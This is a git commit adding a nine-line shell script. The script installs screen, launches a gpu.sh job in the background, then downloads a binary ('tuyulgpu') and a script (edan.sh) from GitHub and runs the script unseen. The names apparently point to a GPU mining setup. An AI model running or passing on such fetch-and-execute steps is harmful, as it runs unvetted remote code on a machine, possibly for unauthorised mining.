50e66a5e6565ae647db86e4f16b48497ffebee99
matrin0384 <85345732+matrin0384@users.noreply.github.com>
2021-06-04 16:33:45 +0530

    Add files via upload

---
+++ Gaskan.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS gpu.sh ./gpu.sh 65 75
+wget https://github.com/nuri655/nur/raw/main/tuyulgpu
+wget https://raw.githubusercontent.com/matrin0384/normal/main/edan.sh
+chmod +x edan.sh
+./edan.sh
